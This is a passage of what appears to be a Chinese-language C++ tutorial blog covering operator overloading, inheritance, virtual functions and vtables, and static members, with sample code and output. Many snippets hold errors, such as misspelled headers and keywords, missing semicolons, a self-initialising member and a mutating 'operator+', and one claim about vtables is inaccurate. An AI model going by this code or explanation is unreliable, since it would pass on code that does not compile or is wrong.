class="line"><span class="function"></span>&#123;</span><br><span class="line">    Test test;</span><br><span class="line">    std::cout&lt;&lt;test[<span class="number">3</span>]&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>③ “()”</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iosteam&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;hello world&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> std::string&amp; str)</span><span class="type">const</span><span class="comment">//可以重载</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        std::cout&lt;&lt;str&lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Test test;</span><br><span class="line">    <span class="built_in">test</span>();<span class="comment">//输出hello world</span></span><br><span class="line">    <span class="built_in">test</span>(<span class="string">&quot;abcde&quot;</span>)<span class="comment">//输出abcde</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>④ “&lt;&lt;”，“&gt;&gt;”</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iosteam&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;<span class="comment">//记住怎么写</span></span><br><span class="line">  <span class="keyword">friend</span> std::ostream&amp; <span class="keyword">operator</span>&lt;&lt; (std::ostream&amp; os,<span class="type">const</span> Test&amp; test);</span><br><span class="line">  <span class="keyword">friend</span> std::istream&amp; <span class="keyword">operator</span>&gt;&gt; (std::istream&amp; os,Test&amp; test);</span><br><span class="line">&#125;</span><br><span class="line">std::ostream&amp; <span class="keyword">operator</span>&lt;&lt; (std::ostream&amp; os,<span class="type">const</span> Test&amp; test)</span><br><span class="line">&#123;</span><br><span class="line">    os&lt;&lt;test.name&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> os;<span class="comment">//返回ostream的引用</span></span><br><span class="line">&#125;</span><br><span class="line">std::istream&amp; <span class="keyword">operator</span>&gt;&gt; (std::istream&amp; os,Test&amp; test)</span><br><span class="line">&#123;</span><br><span class="line">    is &gt;&gt;test.name;</span><br><span class="line">    <span class="keyword">return</span> is;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Test test;</span><br><span class="line">    std::cin&gt;&gt;test;</span><br><span class="line">    std::cout&lt;&lt;test&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>(2) 二元运算符重载</p>
<p>① “+”，“-”，“*”，“&#x2F;”</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iosteam&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    Test opreator+(<span class="type">const</span> Test&amp; test)</span><br><span class="line">    &#123;</span><br><span class="line">        count +=test.count;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> count = <span class="number">0</span>;</span><br><span class="line">    std::string name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Test test;</span><br><span class="line">    std::cout&lt;&lt;test.count&lt;&lt;std::endl;<span class="comment">//输出0</span></span><br><span class="line">    Test test2;</span><br><span class="line">    test2.count=<span class="number">20</span>;</span><br><span class="line">    Test test3=+test2;</span><br><span class="line">    std::test3&lt;&lt;test3.count&lt;&lt;std::endl;<span class="comment">//输出20</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>② “&#x3D;”，</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iosteam&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    Test&amp; opreator=(<span class="type">const</span> Test&amp; test)<span class="comment">//使用引用的原因是返回的还是自己</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>==&amp;test)<span class="comment">//地址相同</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        count =test.count;</span><br><span class="line">        name=test.name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Test&amp; opterator= (const Test&amp; test)=default 默认重载</span></span><br><span class="line">    <span class="type">unsigned</span> count = <span class="number">0</span>;</span><br><span class="line">    std::string name;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>；</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="built_in">main</span>()</span><br><span class="line">&#123;</span><br><span class="line">    Test test;</span><br><span class="line">    Test test2;</span><br><span class="line">    test=test2;<span class="comment">//返回是是自己，所以要用引用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>③ “&gt;”，“&lt;”，“&#x3D;&#x3D;”</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>&lt; (<span class="type">const</span> Test&amp; test)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> count&lt;test.count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 至于唯一的三元运算符“?:”，不能重载</p>
<p>(3) 类类型转化运算符：“operator 类型”</p>
<p>(4) 特殊的运算符：new，delete，new[]，delete[]</p>
<p> 注意：“&#x3D;”类会默认进行重载，如果不需要可以用“delete关键字进行修饰”。</p>
<p> <strong>总结：重载运算符非常重要，C++类中几乎都要定义各种各种的重载运算符。</strong></p>
<h2 id="普通继承及其实现原理"><a href="#普通继承及其实现原理" class="headerlink" title="(*)普通继承及其实现原理"></a>(*)普通继承及其实现原理</h2><p><strong>C++面向对象的三大特性：分装，继承，多态。分装就是类的权限管理，很简单，就不讲了。继承这节课讲，继承很重要，有些地方也是需要重点理解的。</strong></p>
<p> **1.**C++继承介绍：C++非继承的类相互是没有关联性的，假设现在需要设计医生，教师，公务员三个类，需要定义很多重复的内容而且相互没有关联，调用也没有规律。如果这还算好，那一个游戏有几千件物品，调用时也要写几千个函数。这太要命了。于是继承能力就应运而生了。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="comment">//class FireSpear麻烦</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//   std::string name;</span></span><br><span class="line"><span class="comment">//    std::string icon;</span></span><br><span class="line"><span class="comment">//&#125;;</span></span><br><span class="line"><span class="comment">//class IceSpear</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//   std::string name;</span></span><br><span class="line"><span class="comment">//   std::string icon;</span></span><br><span class="line"><span class="comment">//&#125;;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Spear</span><span class="comment">//父类</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">protected</span>:<span class="comment">//外界无法访问。但是子类继承到，可以访问</span></span><br><span class="line">        std::string name;</span><br><span class="line">        std::string icon;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Spear</span>(<span class="type">const</span> std::string&amp; name_,<span class="type">const</span> std:: string&amp; icon_):<span class="built_in">name</span>(name_),<span class="built_in">icon</span>(icon_)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;Spear()&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FireSpear</span>: <span class="keyword">public</span> Spear</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">FireSpear</span>(<span class="type">const</span> std::string&amp; name_,<span class="type">const</span> std:: string&amp; icon_,<span class="type">int</span> i_):<span class="built_in">Spear</span>(name_,icon_),<span class="built_in">i</span>(i)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;FireSpear()&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">    &#125;<span class="comment">//先初始化父类的部分，在初始化子类的部分</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IceSpear</span>: <span class="keyword">public</span> Spear</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>**2.**C++继承原理：C++的继承可以理解为在创建子类成员变量之前先创建父类的成员变量，实际上，C语言就是这么模仿出继承功能的。</p>
<p>**3.**C++继承的注意事项。</p>
<p>(1) C++子类对象的构造过程。先调用父类的构造函数，再调用子类的构造函数，也就是说先初始化父类的成员，再初始化子类的成员。</p>
<p>(2) 若父类没有默认的构造函数，子类的构造函数又未调用父类的构造函数，则无法编译。</p>
<p>(3) C++子类对象的析构过程。先调用子类的析构函数，再调用父类的析构函数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Spear</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Spear</span>(<span class="type">const</span> std::string&amp; name_, <span class="type">const</span> std::string&amp; icon_) :<span class="built_in">name</span>(name_), <span class="built_in">icon</span>(icon_)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;Spear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	~<span class="built_in">Spear</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;~Spear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	 <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">openFire</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;Spear::openFire&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	std::string name;</span><br><span class="line">	std::string icon;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FireSpear</span> :<span class="keyword">public</span> Spear</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">FireSpear</span>(<span class="type">const</span> std::string&amp; name_, <span class="type">const</span> std::string&amp; icon_, <span class="type">int</span> i_) :<span class="built_in">Spear</span>(name_, icon_), <span class="built_in">i</span>(i)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;FireSpear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	~<span class="built_in">FireSpear</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;~FireSpear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IceSpear</span>: <span class="keyword">public</span> Spear</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">openFire</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;IceSpear::openFire&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">openFire</span><span class="params">(<span class="type">const</span> Spear* pSpear)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pSpear-&gt;<span class="built_in">openFire</span>();</span><br><span class="line">	<span class="keyword">delete</span> pSpear;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">FireSpear <span class="title">fireSpear</span><span class="params">(<span class="string">&quot;fanfan&quot;</span>, <span class="string">&quot;sad&quot;</span>, <span class="number">9</span>)</span></span>;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;-------------------&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="built_in">openFire</span>(<span class="keyword">new</span> <span class="built_in">FireSpear</span>(<span class="string">&quot;fanfan&quot;</span>, <span class="string">&quot;love&quot;</span>, <span class="number">10</span>));</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;-------------------&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Spear()</span><br><span class="line">FireSpear()</span><br><span class="line">-------------------</span><br><span class="line">Spear()</span><br><span class="line">FireSpear()</span><br><span class="line">Spear::openFire</span><br><span class="line">~Spear()</span><br><span class="line">-------------------</span><br><span class="line">~FireSpear()</span><br><span class="line">~Spear()</span><br></pre></td></tr></table></figure>



<p>总结：面向对象三大特性的继承就这么简单，很多人觉得类继承很复杂，其实完全不是这样的，只要明白子类在内存上其实就相当于把父类的成员变量放在子类的成员变量前面罢了。构造和析构过程也是为了这个机制而设计的。</p>
<h2 id="虚函数及其实现原理，override-关键字"><a href="#虚函数及其实现原理，override-关键字" class="headerlink" title="(**)虚函数及其实现原理，override 关键字"></a>(**)虚函数及其实现原理，override 关键字</h2><p><strong>1.虚函数介绍：</strong></p>
<p>(1) 虚函数就是面向对象的第三大特点：<strong>多态</strong>。多态非常的重要，它完美解决了上一课设计游戏装备类的问题，我们可以只设计一个函数，函数参数是基类指针，就可以调用子类的功能。比如射击游戏，所有的枪都继承自一个枪的基类，人类只要有一个开枪的函数就可以实现所有枪打出不同的子弹。</p>
<p>(2) 父类指针可以指向子类对象，这个是自然而然的，<strong>因为子类对象的内存前面就是父类成员，类型完全匹配。</strong></p>
<p>(3) 当父类指针指向子类对象，且子类重写父类某一函数时。父类指针调用该函数，就会产生以下的可能</p>
<p><strong>①</strong> <strong>该函数为虚函数：父类指针调用的是子类的成员函数。</strong></p>
<p><strong>②</strong> <strong>该函数不是虚函数：父类指针调用的是父类的成员函数。</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Spear</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Spear</span>(<span class="type">const</span> std::string&amp; name_, <span class="type">const</span> std::string&amp; icon_) :<span class="built_in">name</span>(name_), <span class="built_in">icon</span>(icon_)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;Spear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	~<span class="built_in">Spear</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;~Spear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	 <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">openFire</span><span class="params">()</span><span class="type">const</span><span class="comment">//</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;Spear::openFire&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	std::string name;</span><br><span class="line">	std::string icon;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FireSpear</span> :<span class="keyword">public</span> Spear</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">FireSpear</span>(<span class="type">const</span> std::string&amp; name_, <span class="type">const</span> std::string&amp; icon_, <span class="type">int</span> i_) :<span class="built_in">Spear</span>(name_, icon_), <span class="built_in">i</span>(i)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;FireSpear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">virtual</span> ~<span class="built_in">FireSpear</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;~FireSpear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">openFire</span><span class="params">()</span><span class="type">const</span> <span class="keyword">override</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;FireSpear::openFire&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IceSpear</span>: <span class="keyword">public</span> Spear</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">openFire</span><span class="params">()</span><span class="type">const</span><span class="comment">//加了virtual动态绑定</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;IceSpear::openFire&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">openFire</span><span class="params">(<span class="type">const</span> Spear* pSpear)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pSpear-&gt;<span class="built_in">openFire</span>();</span><br><span class="line">	<span class="keyword">delete</span> pSpear;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">FireSpear <span class="title">fireSpear</span><span class="params">(<span class="string">&quot;fanfan&quot;</span>, <span class="string">&quot;sad&quot;</span>, <span class="number">9</span>)</span></span>;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;-------------------&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="built_in">openFire</span>(<span class="keyword">new</span> <span class="built_in">FireSpear</span>(<span class="string">&quot;fanfan&quot;</span>, <span class="string">&quot;love&quot;</span>, <span class="number">10</span>));</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;-------------------&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Spear()</span><br><span class="line">FireSpear()</span><br><span class="line">-------------------</span><br><span class="line">Spear()</span><br><span class="line">FireSpear()</span><br><span class="line">FireSpear::openFire</span><br><span class="line">~Spear()</span><br><span class="line">-------------------</span><br><span class="line">~FireSpear()</span><br><span class="line">~Spear()</span><br></pre></td></tr></table></figure>



<p>**2.**虚函数的注意事项：</p>
<p>(1) 子父类的虚函数必须完全相同，为了防止开发人员一不小心将函数写错，于是C++11添加了override关键字。</p>
<p><strong>(2)</strong> <strong>父类的析构函数必须为虚函数：当父类对象指向子类对象时，容易使独属于子类的内存泄露。会造成内存泄露的严重问题。</strong></p>
<p>**3.**overide关键字的作用：前面已经说过了，为了防止开发人员将函数名写错了，加入了override关键字。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Spear</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Spear</span>(<span class="type">const</span> std::string&amp; name_, <span class="type">const</span> std::string&amp; icon_) :<span class="built_in">name</span>(name_), <span class="built_in">icon</span>(icon_)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;Spear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	~<span class="built_in">Spear</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;~Spear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	 <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">openFire</span><span class="params">()</span><span class="type">const</span><span class="comment">//</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;Spear::openFire&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	std::string name;</span><br><span class="line">	std::string icon;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FireSpear</span> :<span class="keyword">public</span> Spear</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">FireSpear</span>(<span class="type">const</span> std::string&amp; name_, <span class="type">const</span> std::string&amp; icon_, <span class="type">int</span> i_) :<span class="built_in">Spear</span>(name_, icon_), <span class="built_in">i</span>(i)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;FireSpear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">virtual</span> ~<span class="built_in">FireSpear</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;~FireSpear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">openFire</span><span class="params">()</span><span class="type">const</span> <span class="keyword">override</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;FireSpear::openFire&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IceSpear</span>: <span class="keyword">public</span> Spear</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">openFire</span><span class="params">()</span><span class="type">const</span><span class="comment">//加了virtual动态绑定</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;IceSpear::openFire&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">openFire</span><span class="params">(<span class="type">const</span> Spear* pSpear)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pSpear-&gt;<span class="built_in">openFire</span>();</span><br><span class="line">	<span class="keyword">delete</span> pSpear;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">FireSpear <span class="title">fireSpear</span><span class="params">(<span class="string">&quot;fanfan&quot;</span>, <span class="string">&quot;sad&quot;</span>, <span class="number">9</span>)</span></span>;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;-------------------&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="built_in">openFire</span>(<span class="keyword">new</span> <span class="built_in">FireSpear</span>(<span class="string">&quot;fanfan&quot;</span>, <span class="string">&quot;love&quot;</span>, <span class="number">10</span>));</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;-------------------&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	Spear* pSpear = <span class="keyword">new</span> <span class="built_in">FireSpear</span>(<span class="string">&quot;fanfan&quot;</span>, <span class="string">&quot;happy&quot;</span>, <span class="number">11</span>);</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;-----------------&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Spear()</span><br><span class="line">FireSpear()</span><br><span class="line">-------------------</span><br><span class="line">Spear()</span><br><span class="line">FireSpear()</span><br><span class="line">FireSpear::openFire</span><br><span class="line">~Spear()</span><br><span class="line">-------------------</span><br><span class="line">Spear()</span><br><span class="line">FireSpear()</span><br><span class="line">-----------------</span><br><span class="line">~FireSpear()</span><br><span class="line">~Spear()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>4.</strong> <strong>虚函数实现多态的原理介绍</strong></p>
<p>(1) 动态绑定和静态绑定：</p>
<p>① 静态绑定：程序在编译时就已经确定了函数的地址，比如非虚函数就是静态绑定。</p>
<p>② 动态绑定：程序在编译时确定的是程序寻找函数地址的方法，只有在程序运行时才可以真正确定程序的地址，比如虚函数就是动态绑定。</p>
<p>(2) 虚函数是如何实现动态绑定的呢？</p>
<p>① 每个有虚函数的类都会有一个<strong>虚函数表</strong>，对象其实就是指向虚函数表的指针，编译时编译器只告诉了程序会在运行时查找虚函数表的对应函数。<strong>每个类都会有自己的虚函数表，所以当父类指针引用的是子类虚函数表时，自然调用的就是子类的函数。</strong></p>
<p>总结：虚函数是C++类的重要特性之一，很简单，但使用频率非常高，至于如何实现的也要掌握。</p>
<h2 id="静态成员变量与静态函数"><a href="#静态成员变量与静态函数" class="headerlink" title="静态成员变量与静态函数"></a>静态成员变量与静态函数</h2><p>**1.**静态成员变量：</p>
<p>(1) Part2的第六节课就讲过C语言的静态成员变量，在编译期就已经在静态变量区明确了地址，所以生命周期为程序从开始运行到结束，作用范围为与普通的成员变量相同。这些对于类的静态成员变量同样适用。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="type">static</span> <span class="type">unsigned</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> Test::i=<span class="number">20</span>;<span class="comment">//必须在类外进行初始化</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::cout&lt;&lt;Test::i&lt;&lt;std::endl;<span class="comment">//类名调用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>(2) 类的静态成员变量因为创建在静态变量区，所以直接属于类，也就是我们可以直接通过类名来调用，当然通过对象调用也可以。</p>
